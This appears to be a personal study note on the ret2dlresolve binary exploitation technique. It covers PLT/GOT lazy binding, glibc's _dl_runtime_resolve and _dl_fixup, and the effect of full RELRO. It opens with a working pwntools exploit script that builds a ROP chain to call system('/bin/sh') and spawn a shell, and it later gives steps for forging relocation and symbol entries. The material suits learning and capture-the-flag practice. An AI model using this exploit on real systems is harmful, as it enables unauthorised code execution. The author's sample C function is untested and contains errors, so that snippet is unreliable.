# Pwntools
```python
offset = 69

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr, 0x100)
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

payload = (b'A'*offset) + raw_rop
payload += b'A'*(0x64-len(payload))

payload2 = dlresolve.payload
payload2 += b'A'*(0x100-len(dlresolve.payload))

print(rop.dump())
print(payload + payload2)

io = start()

io.send(payload)
io.send(payload2)

io.interactive()
```

# Resolving a function

## General execution flow

We can see a call to an imported function through the ```@plt``` added to the symbol name in gdb, ```call   0x80482e0 <read@plt>```, wich means that the address called is the associated stub code from the PLT segment. We can also see those functions in any disassembler by looking at the .plt section.

When one of those functions is called, two things can happen. If the function has already been called at least once, then it is already resolved. The call will lead to the first part of the stub, and jump to its resovled address the GOT. Note that if it the case, we can even directly jump to the GOT entry (```<read@got>```).

If the functions is called for the first time, then the second stub is called. This stub pushes the associated Rel table index into the stacks and execution jumps to the PLT0 stub.
The PLT0 stub pushes pushes GOT[1] (link_map structure instance) on the stack and jumps to GOT[2] (```_dl_runtime_resolve``` pointer) , combined with the previous push, this exssentialy calls ```_dl_runtime_resolve(link_map_obj, reloc_index)```.

```_dl_runtime_resolve``` then uses the link_map to resolve the function identified by the reloc_index argument and writes the resulting address into the associated GOT entry. The call is finalised through a jump to the resulting address, as initialy requiered by the  ```call   0x80482e0 <read@plt>```.
This makes the overall execution flow look like this:

First call:
```
call <read@plt> --> PLT stub part2 --> PLT0 stub --> GOT[2] --> _dl_runtime_resolve(link_map_obj, reloc_index) --> imported read()
```
Second call:
```
call <read@plt> --> PLT stub part1 --> GOT[got_read_index] --> imported read()
```

## \_DL_RUNTIME_RESOLVE

The following text description is taken from this [article](https://ypl.coffee/dl-resolve/) , wich, I believe, pretty well summarizes it.

To quickly summarize, our \_dl_runtime_resolve() was given two parameters, link_map (0x7ffff7ffe700) and reloc_index (0x0). The l_info field of link_map gives \_dl_runtime_resolve() the addresses of .rela.plt, .dynsym and .dynstr sections.

.rela.plt section contains Elf64_Rela structs. .dynsym section contains Elf64_Sym structs. .dynstr section contains **zero-terminated** strings.

Then, as told by reloc_index, \_dl_runtime_resolve() looks at the 0x0th Elf64_Rela struct in .rela.plt section, which contains relocation information of read(). \_dl_runtime_resolve() then looks at its r_info field. The higher **32** **bits** of r_info is 0x2, which is another index into .dynsym.

Then, as told by r_info, \_dl_runtime_resolve() looks at the 0x2th Elf64_Sym struct instance in .dynsym section, which contains information of our read global symbol. \_dl_runtime_resolve() then looks at its st_name field, which is 0xb, another index into .dynstr.

Finally, as told by st_name, \_dl_runtime_resolve() finds the "read\\0" string in .dynstr section at an offset of 0xb bytes.

From now on, \_dl_runtime_resolve() is going to use this "read\\0" string and search it in all loaded shared objects, find the "real" address of read(), update its .got.plt entry in our main binary, simple (with the help of r_offset) so that when next time read() is called, we no longer need to resolve it again. Finally, \_dl_runtime_resolve() jumps to read().

Simplified diagram:
```
link_map{}       l_info[]
__________       ________________
|l_info  | <---- |.rela.plt addr| <-- Elf64_Rela struct array
|--------|       |--------------|
|  ...   |       |.dynsym addr  | <-- Elf64_Sym struct array
|--------|       |--------------|
                 |.dynstr addr  | <-- String array (symbole names)
                 |--------------|

reloc_index <-- index of the desired Rela struct array in .rela.plt

(Rela struct[offset].r_info >> 8) <-- Associated Sym struct array offset in .dynsym

(Sym struct[r_info offset].st_name) <-- Associated offset in the string table .dynstr

String_table[st_name] <-- Associated symbole name
```

So, to find the correct symbol name, a simple and straightforward C implementation could look like this:
```c
define ELF32_R_SYM(val) ((val) >> 8)

/*Notes:
	The names are simplified.
	The function isn't tested because I'm lazy and writing this during my christmas hollydays, so it probably contains errors but the general idea is there.*/
const char *find_symbol_name(link_map *map, unsigned int reloc_index)
{
	Elf64_Rela *rela = (Elf64_Rela *) (map->l_info[DT_RELATAB]);  // .rela.plt address
	Elf64_Sym *sym = (Elf64_Sym *) (map->l_info[DT_SYMTAB]);      // .dynsym address
	const char *strtab = (const char *) (map->l_info[DT_STRTAB]); // .dynstr address

	unsigned int sym_index = ELF32_R_SYM(rela[reloc_index].r_info);
	unsigned int strtab_index = sym[sym_index].st_name;
	
	return (strtab[strtab_index]);
}
```

The real implentation of this symbol resolution is handled by a call to ```_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)```.
To find the symbol linked to the newly found name, ```_dl_fixup``` finaly calls the ```_dl_lookup_symbol_x(strtab + sym->st_name, link_map, &sym, link_map->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL))``` function, wich loops over the symbol table until it finds a definition for the given name, and returns it, wich allows for a jump to this definition to finalise the call. The details of this functions are off this scope, but a link to its source code is available in the Ressouces section.


## Notes

The symtab offset is shifted by 4.
```
   mov    esi, edx
   shr    esi, 0x8
   mov    ecx, esi
 → shl    ecx, 0x4
   add    ecx, DWORD PTR [ebx+0x4]
   mov    ebx, DWORD PTR [eax]
   add    edi, ebx
   cmp    dl, 0x7
   mov    DWORD PTR [esp+0x1c], ecx
```

In dl_fixup, r->info type must be equal to 0x7.
```
   add    ecx, DWORD PTR [ebx+0x4]
   mov    ebx, DWORD PTR [eax]
   add    edi, ebx
 → cmp    dl, 0x7
   mov    DWORD PTR [esp+0x1c], ecx
   jne    0xf7fad064
```

# Security

If the binary is compiled with the **full relro** security, then not only does the **GOT becomes read only**, meaning it becomes impossible to rewrite it through a format string bug, but more importantly for us in this context, the link_map pointeur and **dl_resolve function pointer aren't updated as well by the linker** in firsts entries of the GOT (leaving them both at 0x00). Making returning to dlresolve an impossble task.

# Exploitation

## Step 1, Primitive

For the first step, you need to be able to write a ROP chain decently long, to a known address. If you lack the space, or ASLR is on, a stack pivoting to the heap, on an address that you know will work more often than not, might help. This is done by overwriting the saved ebp with the target address and calling a ```leave, ret``` gadget. If you have access to read and didn't pivote into the heap because you have enough space for the whole rop chain, you can simply read the next stage into in a valid address in the heap, in order to better predict the indexes.

### Step 2, Crafting our own Relocation, Symbol and StrTab entries

Following the previously described execution flow of a typical function resolve, the next step is to jump into the PLT0 stub with our own reloc index, wich will be big enough to, when added to the .rela.plt address, point to our own, hand crafted Rel structure.
Wich its r_info index, added to the .dynsym address, will point to our own handcrafted Sym structure.
Wich its st_name, added to the .dynstr address, will itslef point to a hand crafted symbol name string. Probably "system\\0". (Note that we want to be able to calculate those indexes in advance, this is why it is important, as said in step 1, to know the adress we are writing our entries on. Also note that we can put every field of every crafted entry structures that doesn't interest us, so every field but the indexes, to some junk, except for st_other of the Sym structure, wich must be 0.)
That way, when ```_dl_runtime_resolve``` is called, it will pass on our controled symbol name to ```_dl_lookup_symbol_x()``` and call the resulting defintion.

With this technique, not only can we call any libc function without a leak, but thanks to the power of ```_dl_lookup_symbol_x()```, we can call any symbol that exists in any shared object linked to our victim binary executable.

```
--------------------------------------------------------------------------------------
.plt start (PLT0 stub) | reloc_indexe | ret_addr | fct_args_addr | function_args
--------------------------------------------------------------------------------------
| string symbol name | padding_mem_alignement | sym structure | rel structure | ...
--------------------------------------------------------------------------------------
```

# Ressources

## Segments and tables

- **JMPREL** (**.rel.plt / .rela.plt** for imported functions, **rel.dyn** for imported global variables)
	Relocation table.
	Stores the array of Rel structures.
	``` readelf -r <exe>```

- **DYNSYM** (**.dynsym**)
	Symbole table.
	Stores the array of dynamically resolvable symbols (imported functions) informations.
	Stores the array of Sym structures.
	``` readelf -s <exe>```

- **GOT** (**.got.plt**)
	Global Offset Table.
	Stores either the resolved address of the imported function, or the address of the second part of the assiociated PLT stub.
	The first 3 entries are reserved:
	- GOT[0] = \_DYNAMIC // Dynamic segment address
	- GOT[1] = link_map_obj // Pointer to an internal data structure, of type `link_map`, which describes a loaded shared object and is used internally by the dynamic loader. Those structures are stored as a circular linked list containing an element for each loaded shared object.
	- GOT[2] = // Pointer to ```_dl_runtime_resolve(link_map, reloc_index)```

- **PLT** (**.plt**)
	Procedure Linkage Table.
	Stores one dedicated stub of code for each imported function.
	First stub part jumps to the resolved address of the imported function
	Second stub part  pushes assiociated Rel table index on the stack and jumps to PLT0 stub address.
	PLT0 stub: This stub pushes GOT[1] on the stack and jumps to GOT[2].

- **STRTAB** (**.dynstr**)
	String table.
	Contains the symbol names as an array of regular strings.

- **PT_DYNAMIC** (**.dynamic**)
	Stores the array of the dynamic sections addresses of the shared objects and some other informations
	Pointed to by the special symbol \_DYNAMIC

## Source code

### Rel / Rela
```c
typedef struct
{
	Elf32_Addr r_offset; /* Address, offset at which apply the relocation action */
	Elf32_Word r_info; /* Relocation type and symbol index */
} Elf32_Rel;

typedef struct {
    Elf32_Addr r_offset;
    Elf32_Word r_info;
    Elf32_Sword r_addend; /*Constant value to add during the relocation final address calculation*/
} Elf32_Rela;

/* How to extract and insert information held in the r_info field. */
define ELF32_R_SYM(val) ((val) >> 8)
define ELF32_R_TYPE(val) ((val) & 0xff)
```

### Sym
```c
typedef struct
{
	Elf32_Word st_name ; /* Symbol name (string tbl index) */
	Elf32_Addr st_value ; /* Symbol value */
	Elf32_Word st_size ; /* Symbol size */
	unsigned char st_info ; /* Symbol type and binding */
	unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */
	Elf32_Section st_shndx ; /* Section index */
} Elf32_Sym ;
```

### Dyn
```c
/* the `d_tag` field indicates the purpouse of the entry as indicated in the following (uncomplete) table:

Type             Description

`DT_NULL`        This element marks the end of the `_DYNAMIC` array.

`DT_NEEDED`      This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the `DT_STRTAB` entry

`DT_STRTAB`      This element holds the address of the string table. Symbol names, library names, and other strings reside in this table.

`DT_STRSZ`       The size of the string table

`DT_SYMTAB`      This element holds the address of the symbol table

`DT_SYMENT`      The size of an entry in the symbol table

`DT_INIT`        Address of the initialization function

`DT_FINI`        Address of the de-initialization function

`DT_INIT_ARRAY`  address of an array of initialization functions (it's not described in the original specification)

`DT_FINI_ARRAY`  address of an array of de-initialization functions (it's not described in the original specification)

`DT_PLTGOT`      holds an address associated with the procedure linkage table and/or the global offset table

`DT_PLTREL`      specifies the type of relocation entry to which the procedure linkage table refers

`DT_JMPREL`      If present, this entries’ `d_ptr` member holds the address of relocation entries associated solely with the procedure linkage table.

My thanks to the author of https://ktln2.org/'s articles for this description.
*/

typedef struct {
        Elf32_Sword d_tag;
        union {
                Elf32_Word      d_val;
                Elf32_Addr      d_ptr;
                Elf32_Off       d_off;
        } d_un;
} Elf32_Dyn;

typedef struct {
        Elf64_Xword d_tag;
        union {
                Elf64_Xword     d_val;
                Elf64_Addr      d_ptr;
        } d_un;
} Elf64_Dyn;

externElf32_Dyn _DYNAMIC[]
```

### link_map [(Full source code)](https://codebrowser.dev/glibc/glibc/include/link.h.html#link_map)
```c
/* Structure describing a loaded shared object.  The `l_next' and `l_prev'
   members form a chain of all the shared objects loaded at startup.

   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.

   This data structure might change in future, if necessary.  User-level
   programs must avoid defining objects of this type.  */

struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;      /* Difference between the address in the ELF
                   file and the addresses in memory.  */
    char *l_name;       /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;        /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */

    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    ...

    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
    DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
    DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
    DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr;   /* Pointer to program header table in core.  */
    ElfW(Addr) l_entry;     /* Entry point location.  */
    ElfW(Half) l_phnum;     /* Number of program header entries.  */
    ElfW(Half) l_ldnum;     /* Number of dynamic segment entries.  */

    /* Array of DT_NEEDED dependencies and their dependencies, in
       dependency order for symbol lookup (with and without
       duplicates).  There is no entry before the dependencies have
       been loaded.  */
    struct r_scope_elem l_searchlist;

    /* We need a special searchlist to process objects marked with
       DT_SYMBOLIC.  */
    struct r_scope_elem l_symbolic_searchlist;

    /* Dependent object that first caused this object to be loaded.  */
    struct link_map *l_loader;
    ...

    enum            /* Where this object came from.  */
      {
    lt_executable,      /* The main executable program.  */
    lt_library,     /* Library needed by main executable.  */
    lt_loaded       /* Extra run-time loaded shared object.  */
      } l_type:2;
      ...
    /* Start and finish of memory map for this object.  l_map_start
       need not be the same as l_addr.  */
    ElfW(Addr) l_map_start, l_map_end;
    /* End of the executable part of the mapping.  */
    ElfW(Addr) l_text_end;
    ...
    /* List of object in order of the init and fini calls.  */
    struct link_map **l_initfini;

    /* List of the dependencies introduced through symbol binding.  */
    struct link_map_reldeps
      {
    unsigned int act;
    struct link_map *list[];
      } *l_reldeps;
    unsigned int l_reldepsmax;

    /* Nonzero if the DSO is used.  */
    unsigned int l_used;
    ...
}
```

### \_dl_runtime_resolve
```assembly
_dl_runtime_resolve:
        cfi_adjust_cfa_offset (8)
        _CET_ENDBR
        pushl %eax                 # Preserve registers otherwise clobbered.
        cfi_adjust_cfa_offset (4)
        pushl %ecx
        cfi_adjust_cfa_offset (4)
        pushl %edx
        cfi_adjust_cfa_offset (4)
        movl 16(%esp), %edx        # Copy args pushed by PLT in register.
        movl 12(%esp), %eax        # 'fixup' takes its parameters in regs.
        call _dl_fixup             # Call resolver.
        popl %edx                  # Get register content back.
        cfi_adjust_cfa_offset (-4)
        movl (%esp), %ecx
        movl %eax, (%esp)           # Store the function address.
        movl 4(%esp), %eax
        ret $12                     # Jump to function address.
```

### \_dl_fixup
```c
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
           ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
           struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;
  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
      /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
        {
          THREAD_GSCOPE_SET_FLAG ();
          flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
        THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif
      /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                                   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```
### \_dl_lookup_symbol_x [(source code)](https://codebrowser.dev/glibc/glibc/elf/dl-lookup.c.html)
